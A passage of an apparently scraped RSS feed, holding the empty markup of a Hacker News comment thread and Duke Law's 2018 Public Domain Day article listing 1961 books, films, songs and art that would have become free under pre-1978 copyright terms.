&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046696&quot; readability=&quot;1.0384615384615&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047143&quot; readability=&quot;6.5058823529412&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2529411764706&quot;&gt;&lt;tr readability=&quot;6.5058823529412&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047414&quot; readability=&quot;3.5838926174497&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7919463087248&quot;&gt;&lt;tr readability=&quot;3.5838926174497&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.4798657718121&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047701&quot; readability=&quot;2.2432432432432&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047105&quot; readability=&quot;3.468085106383&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7340425531915&quot;&gt;&lt;tr readability=&quot;3.468085106383&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046382&quot; readability=&quot;5.2105263157895&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046938&quot; readability=&quot;0.88888888888889&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046222&quot; readability=&quot;3.0033898305085&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046251&quot; readability=&quot;2.9078947368421&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046435&quot; readability=&quot;2.5454545454545&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046576&quot; readability=&quot;2.0666666666667&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046321&quot; readability=&quot;3.1578947368421&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046223&quot; readability=&quot;1.8360655737705&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047296&quot; readability=&quot;2.2615384615385&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046464&quot; readability=&quot;10.03550295858&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.0177514792899&quot;&gt;&lt;tr readability=&quot;10.03550295858&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.8540433925049&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046190&quot; readability=&quot;1.7865168539326&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046070&quot; readability=&quot;5.4213286713287&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046119&quot; readability=&quot;2.4941176470588&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046659&quot; readability=&quot;4.5205479452055&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2602739726027&quot;&gt;&lt;tr readability=&quot;4.5205479452055&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046669&quot; readability=&quot;2.8510638297872&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046384&quot; readability=&quot;2.6666666666667&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047806&quot; readability=&quot;2.8051948051948&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046342&quot; readability=&quot;4.1986754966887&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048127&quot; readability=&quot;8.0675675675676&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.0337837837838&quot;&gt;&lt;tr readability=&quot;8.0675675675676&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.722972972973&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046810&quot; readability=&quot;2.325&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047826&quot; readability=&quot;1.3076923076923&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047624&quot; readability=&quot;2.4933687002653&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046334&quot; readability=&quot;1.4047619047619&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046115&quot; readability=&quot;0.9344262295082&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046206&quot; readability=&quot;6.0508474576271&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.0254237288136&quot;&gt;&lt;tr readability=&quot;6.0508474576271&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046326&quot; readability=&quot;5.8650168728909&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.9325084364454&quot;&gt;&lt;tr readability=&quot;5.8650168728909&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;9.2862767154106&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046798&quot; readability=&quot;3.344262295082&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.672131147541&quot;&gt;&lt;tr readability=&quot;3.344262295082&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047532&quot; readability=&quot;4.2056074766355&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048213&quot; readability=&quot;1.7687861271676&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048371&quot; readability=&quot;6.4153354632588&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2076677316294&quot;&gt;&lt;tr readability=&quot;6.4153354632588&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.2124600638978&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047589&quot; readability=&quot;1.71875&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046906&quot; readability=&quot;2.0853658536585&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046239&quot; readability=&quot;0.84297520661157&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047821&quot; readability=&quot;12.286396181384&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.1431980906921&quot;&gt;&lt;tr readability=&quot;12.286396181384&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.7804295942721&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046031&quot; readability=&quot;1.7371601208459&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046147&quot; readability=&quot;3.5726495726496&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7863247863248&quot;&gt;&lt;tr readability=&quot;3.5726495726496&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048835&quot; readability=&quot;1.7692307692308&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046909&quot; readability=&quot;2.5396825396825&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047076&quot; readability=&quot;1.5759493670886&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047126&quot; readability=&quot;3.5708812260536&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7854406130268&quot;&gt;&lt;tr readability=&quot;3.5708812260536&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046120&quot; readability=&quot;1.7278481012658&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047724&quot; readability=&quot;14.287322564856&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;7.1436612824278&quot;&gt;&lt;tr readability=&quot;14.287322564856&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;21.010768477729&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;</description>
<pubDate>Mon, 01 Jan 2018 12:43:04 +0000</pubDate>
<dc:creator>dev_256</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=16045859</dc:identifier>
</item>
<item>
<title>What Could Have Entered the Public Domain on January 1, 2018</title>
<link>https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/</link>
<guid isPermaLink="true" >https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/</guid>
<description>

&lt;h2&gt;What &lt;em&gt;Could&lt;/em&gt; Have Entered the Public Domain on January 1, 2018?&lt;/h2&gt;
&lt;h3&gt;Under the law that existed until 1978 . . . Works from 1961 &lt;span class=&quot;c1&quot;&gt;      &lt;a class=&quot;twitter-share-button&quot; href=&quot;https://twitter.com/share&quot;&gt;Tweet&lt;/a&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&quot;Illustration of works that could have entered the public domain on January 1, 2018&quot; src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/2018whatmighthave.png&quot; /&gt;&lt;/p&gt;
&lt;h5 class=&quot;green&quot;&gt;The books &lt;em&gt;Catch-22&lt;/em&gt;, &lt;em&gt;Stranger in a Strange Land&lt;/em&gt;, and &lt;em&gt;The Phantom Tollbooth&lt;/em&gt;, the films &lt;em&gt;Breakfast at Tiffany’s&lt;/em&gt; and &lt;em&gt;West Side Story&lt;/em&gt;, and more. . .&lt;/h5&gt;
&lt;p&gt;Current US law extends copyright for 70 years after the date of the author's death, and corporate “works-for-hire” are copyrighted for 95 years after publication. But prior to the 1976 Copyright Act (which became effective in 1978), the maximum copyright term was 56 years—an initial term of 28 years, renewable for another 28 years. Under those laws, works published in 1961 would enter the public domain on January 1, 2018, where they would be “free as the air to common use.” Under current copyright law, we’ll have to wait until &lt;em&gt;&lt;strong&gt;2057&lt;/strong&gt;&lt;/em&gt;.&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn1text&quot;&gt;1&lt;/a&gt; And no published works will enter our public domain until 2019. The laws in other countries are different—&lt;a href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/&quot; target=&quot;_blank&quot;&gt;thousands of works are entering the public domain in Canada and the EU on January 1&lt;/a&gt;.&lt;/p&gt;
&lt;h3 class=&quot;green&quot;&gt;Catch-2057&lt;/h3&gt;
&lt;p&gt;What books would be entering the public domain if we had the pre-1978 copyright laws? You might recognize some of the titles below.&lt;/p&gt;
&lt;div class=&quot;bookcontainer&quot; id=&quot;bookcontainer&quot;&gt;

&lt;div class=&quot;booklist&quot; id=&quot;booklist&quot;&gt;
&lt;ul class=&quot;c2&quot;&gt;&lt;li&gt;Joseph Heller, &lt;span class=&quot;colortitles&quot;&gt;Catch-22&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Walker Percy, &lt;span class=&quot;colortitles&quot;&gt;The Moviegoer&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;J.D. Salinger, &lt;span class=&quot;colortitles&quot;&gt;Franny and Zooey&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;John Howard Griffin, &lt;span class=&quot;colortitles&quot;&gt;Black Like Me&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Irving Stone, &lt;span class=&quot;colortitles&quot;&gt;The Agony and the Ecstasy&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Muriel Spark, &lt;span class=&quot;colortitles&quot;&gt;The Prime of Miss Jean Brodie&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Robert A. Heinlein, &lt;span class=&quot;colortitles&quot;&gt;Stranger in a Strange Land&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;William S. Burroughs, &lt;span class=&quot;colortitles&quot;&gt;The Soft Machine&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Norton Juster, &lt;span class=&quot;colortitles&quot;&gt;The Phantom Tollbooth&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Roald Dahl, &lt;span class=&quot;colortitles&quot;&gt;James and the Giant Peach&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;rightimagecaption&quot; readability=&quot;9.9240506329114&quot;&gt;&lt;img src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/bh-526-burroughs-15-1200.jpg&quot; /&gt;&lt;br /&gt;Taking remix to another level, Burroughs wrote &lt;em&gt;The Soft Machine&lt;/em&gt; using the &quot;cut-up technique,&quot; where existing text is cut up and rearranged to create a new work. (Image from BOO-HOORAY's exhibit &lt;a href=&quot;http://www.boo-hooray.com/cut-up-william-s-burroughs/&quot; target=&quot;_blank&quot;&gt;Cut-Ups: William S. Burroughs 1914–2014&lt;/a&gt;.)&lt;/div&gt;
&lt;p&gt;What a trove of books! They are but a fraction of what would be entering the public domain on January 1. Imagine them being freely available to students and educators around the world—many of the themes in these books certainly resonate today.&lt;/p&gt;
&lt;p&gt;You would be free to use these books for theater, or make them into a film. You could translate them into other languages, or create accessible Braille or audio versions.&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn2text&quot;&gt;2&lt;/a&gt; You could read them online or buy cheaper print editions, because others were free to republish them. Empirical studies have shown that public domain books are less expensive, available in more editions and formats, and more likely to be in print—see &lt;a href=&quot;http://www.minnesotalawreview.org/articles/property-rights-efficient-exploitation-copyrighted-works-empirical-analysis-public-domain-copyrighted-fiction-bestsellers/&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;http://papers.ssrn.com/sol3/papers.cfm?abstract_id=2130008&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;, and &lt;a href=&quot;http://papers.ssrn.com/sol3/papers.cfm?abstract_id=2290181&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;. Imagine a digital Library of Alexandria containing all of the world’s books from 1961 and earlier, where, thanks to technology, you can search, link, annotate, copy and paste. (Google Books has brought us closer to this reality, but for copyrighted books where there is no separate agreement with the copyright holder, it only shows three short snippets, not the whole book.) &lt;span class=&quot;colortitles&quot;&gt;Instead of seeing these literary works enter the public domain in 2018, we will have to wait until 2057.&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;green&quot;&gt;The Copyright Trap&lt;/h3&gt;
&lt;p&gt;Consider the films from 1961 that would have become available this year. You could share clips with friends or incorporate them into fan fiction. Community theaters could show the full features. Libraries and archivists would be free to digitize and preserve them. Here are a few of the movies that we won’t see in the public domain for another 39 years.&lt;/p&gt;
&lt;div class=&quot;moviecontainer&quot; id=&quot;moviecontainer&quot;&gt;

&lt;div class=&quot;movielist&quot; id=&quot;movielist&quot;&gt;
&lt;ul class=&quot;c2&quot;&gt;&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;Breakfast at Tiffany’s&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;West Side Story&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;The Guns of Navarone&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;A Raisin in the Sun&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;The Parent Trap&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;Splendor in the Grass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;Judgment at Nuremberg&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;The Misfits&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;colortitles&quot;&gt;The Hustler&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img alt=&quot;West Side Story: 'America'&quot; src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/westsidestory_americabox2.png&quot; /&gt; If these films were in the public domain, you could use them in your own works, just as they used earlier works in theirs. &lt;em&gt;West Side Story&lt;/em&gt; (music by Leonard Bernstein, lyrics by Stephen Sondheim, book by Arthur Laurents) was free to draw upon &lt;em&gt;Romeo and Juliet&lt;/em&gt; because Shakespeare’s work was in the public domain. And as Judge Richard Posner observed, if the underlying works were copyrighted, “&lt;em&gt;Romeo and Juliet&lt;/em&gt; itself would have infringed Arthur Brooke’s &lt;em&gt;The Tragicall Historye of Romeo and Juliet&lt;/em&gt; . . . which in turn would have infringed several earlier &lt;em&gt;Romeo and Juliets&lt;/em&gt;, all of which probably would have infringed Ovid’s story of &lt;em&gt;Pyramus and Thisbe&lt;/em&gt;.” One work inspires another. That is how the public domain feeds creativity.&lt;/p&gt;
&lt;p&gt;The films above are famous, so thanks to projects like the &lt;a href=&quot;http://www.loc.gov/programs/national-film-preservation-board/about-this-program&quot; target=&quot;_blank&quot;&gt;National Film Registry&lt;/a&gt;, we’re not likely to lose them entirely. The true tragedy is that of forgotten films that are &lt;a href=&quot;https://law.duke.edu/cspd/pdf/cspdorphanfilm.pdf&quot; target=&quot;_blank&quot;&gt;literally disintegrating while preservationists wait for their copyright terms to expire&lt;/a&gt;.&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn3text&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
&lt;h3 class=&quot;green&quot;&gt;Let’s Twist Again . . . Like We Did 56 Years Ago&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/chubby-checkers_lets-twist-again_headline.png&quot; /&gt;What 1961 music could you have used without fear of a lawsuit? If you wanted to find guitar tabs or sheet music and freely use some of the influential music from 1961, January 1 2018 would have been a rocking day for you under earlier copyright laws. Patsy Cline’s classic &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Crazy&lt;/em&gt;&lt;/span&gt; (Willie Nelson) would be available. So would &lt;span class=&quot;colortitles&quot;&gt;Stand By Me&lt;/span&gt; (Ben E. King, Jerry Leiber, Mike Stoller), &lt;span class=&quot;colortitles&quot;&gt;Runaway&lt;/span&gt; (Del Shannon, Max Crook), and &lt;span class=&quot;colortitles&quot;&gt;Let’s Twist Again&lt;/span&gt; (Kal Mann, Dave Appell). You could publicly perform or set short films to &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Surfin'&lt;/em&gt;&lt;/span&gt; (Brian Wilson, Mike Love) or &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Crying&lt;/em&gt;&lt;/span&gt; (Roy Orbison, Joe Melson), all without permission or fee. Today these musical works remain copyrighted until 2057.&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn4text&quot;&gt;4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/elvissinging.png&quot; /&gt;Like &lt;em&gt;West Side Story&lt;/em&gt;, some of the hit songs from 1961 borrowed from earlier works. Elvis Presley’s &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Surrender&lt;/em&gt;&lt;/span&gt; (Doc Pomus, Mort Shuman) was adapted from the 1902 Neapolitan ballad &quot;Torna a Surriento&quot; (Ernesto and Giambattista de Curtis), and his &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Can’t Help Falling in Love&lt;/em&gt;&lt;/span&gt; (Hugo Peretti, Luigi Creatore, George David Weiss) is derived from the 1784 French song &quot;Plaisir d’amour&quot; (Jean-Paul-Égide Martini). (&lt;a href=&quot;https://law.duke.edu/musiccomic/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;To read more about the rich history of borrowing in music, see our free comic book!&lt;/span&gt;&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;For art lovers, 1961 also featured works such as Roy Lichtenstein’s &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;Look Mickey!&lt;/em&gt;&lt;/span&gt;,&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn5text&quot;&gt;5&lt;/a&gt; a pop culture commentary based on an image from Disney’s &lt;em&gt;Donald Duck: Lost and Found&lt;/em&gt;. Lichtenstein was not sued for copyright infringement, but today’s Lichtenstein might very well face a lawsuit. Until works enter the public domain, an artist wanting to legally reuse them as Lichtenstein did would have to rely on “fair use,” a doctrine that allows uses of copyrighted expression for purposes including commentary and criticism. Fair use is a valuable exception, but its application can be complex and unpredictable in practice. It’s unclear whether &lt;em&gt;Look Mickey!&lt;/em&gt; would be protected by fair use. (&lt;a href=&quot;https://law.duke.edu/cspd/comics/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;To learn more about fair use, you can read our comic book on the subject, &lt;em&gt;Bound By Law&lt;/em&gt;, here.&lt;/span&gt;&lt;/a&gt;)&lt;/p&gt;
&lt;h3 class=&quot;green&quot;&gt;Science from 1961—copyrighted research, still behind paywalls&lt;/h3&gt;
